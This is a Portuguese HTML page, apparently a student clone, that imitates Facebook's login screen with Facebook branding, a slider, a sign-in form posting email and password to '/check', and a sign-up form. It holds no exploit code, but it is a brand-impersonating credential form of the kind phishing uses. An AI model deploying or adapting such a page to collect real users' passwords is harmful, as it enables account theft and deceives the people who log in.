<!DOCTYPE html>
<html lang = "pt-br">
<head>
    <meta charset    = "UTF-8">
    <meta http-equiv = "X-UA-Compatible" content = "IE=edge">
    <meta name       = "viewport" content        = "width=device-width, initial-scale=1.0">
    <title>Entre ou Cadastre-se</title>
    <link rel = "shortcut icon" href = "https://www.novaconcursos.com.br/portal/wp-content/uploads/2020/01/facebook-logo-redondo.png" type = "image/x-icon">
    <link rel = "stylesheet" href    = "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
    <link rel = "stylesheet" href    = "/assets/css/main.css">
</head>

<body>
<div id    = "div1">
<div class = "slider">
<div class = "slide"><h2
  >facebook</h2><br><h3>O Facebook ajuda você a se conectar e compartilhar com as pessoas que fazem parte da sua vida.<h3> </div>
  <div class = "slide"><img src = "/imgs/Facebook2.png"> </div>
  <div class = "slide"><img src = "/imgs/Facebook3.png"> </div>
</div>
</div>

<div id    = "div2">
<div class = "login">
<div class = "login-triangle"></div>
<h1  class = "login-header">Facebook</h1>

  <form     method = "POST" action         = "/check" class      = "login-container">
  <p><input type   = "email" name          = "email" placeholder = "Email"></p>
  <p><input id     = "password-field" name = "senha"type         = "password" class = "form-control" name = "password" placeholder = "Senha">
    
      <abbr title = "Ver senha"><span toggle = "#password-field" class = "fa fa-fw fa-eye field-icon toggle-password"></span></abbr>
    </p>
    <p><input type = "submit" value = "Entrar"></p>

    <span class = "msg_error"><i class = "fa fa-exclamation-triangle"></i>Tentativa Inválida </span>
    </form>

    <form method = "POST" action         = "/abrecad"   onclick = 'exibeDiv()' class = "login-container">

    <p><hr><input style = "display:flex;justify-content: center; cursor: pointer;background-color:#42b72a;margin:10px;margin:10px 19px; width: 83%; color:#fff" type = "button" value = "Cadastre-se"></p>
    </form>
</div>
</div>




<!--Cadastro de pessoas-->
<div class = "containercad" >
<a   class = "links" id = "paracadastro"></a>
<a   class = "links" id = "paralogin"></a>
<div class = "content">
<i   onclick = 'closeDiv()' class="fa-close"></i>
      <div  id     = "login">
      <form method = "post" action = "">
          <h1>Login</h1> 
          <p> 
            <label for = "email_login">Seu e-mail</label>
            <input id  = "email_login" name = "email_login" required = "required" type = "text" placeholder = "contato@htmlecsspro.com"/>
          </p>         
          <p> 
            <label for = "senha_login">Sua senha</label>
            <input id  = "senha_login" name = "senha_login" required = "required" type = "password" placeholder = "1234" />
          </p>         
          <p> 
            <input type = "checkbox" name = "manterlogado" id = "manterlogado" value = "" />
            <label for  = "manterlogado">Manter-me logado</label>
          </p>      
          <p> 
            <input type = "submit" value = "Logar" />
          </p>         
          <p class = "link">
            Ainda não tem conta?
            <a href = "#paracadastro">Cadastre-se</a>
          </p>
        </form>
      </div>
      <!--FORMULÁRIO DE CADASTRO-->
      <div  id     = "cadastro">
      <form method = "post" action = "/cadastro">
          <h1>Cadastro</h1>          
          <p> 
            <label for = "nome_cad">Seu nome</label>
            <input id  = "nome_cad" name = "nome_cad" required = "required" type = "text" placeholder = "ex:Guilherme Cavenaghi" />
          </p>          
          <p> 
            <label for = "email_cad">Seu e-mail</label>
            <input id  = "email_cad" name = "email_cad" required = "required" type = "email" placeholder = "ex:contato@htmlecsspro.com"/>
          </p>          
          <p> 
            <label for = "senha_cad">Sua senha</label>
            <input id  = "senha_cad" name = "senha_cad" required = "required" type = "password" placeholder = "ex:1234"/>
          </p>          
          <p> 
            <input method ="POST" action = "/cadastro" style = " cursor: pointer;background-color:#42b72a; color:#fff"   type = "submit" value = "Cadastrar"/>
          </p>          
          </p>
        </form>
      </div>
    </div>
  </div> 
</body>
</html>

<script src = "https://code.jquery.com/jquery-1.9.1.js"></script>
<script src = "/assets/js/glider.js"></script>
<script src = "/assets/js/unmask.js"></script>
<script src = "/assets/js/opencad.js"></script>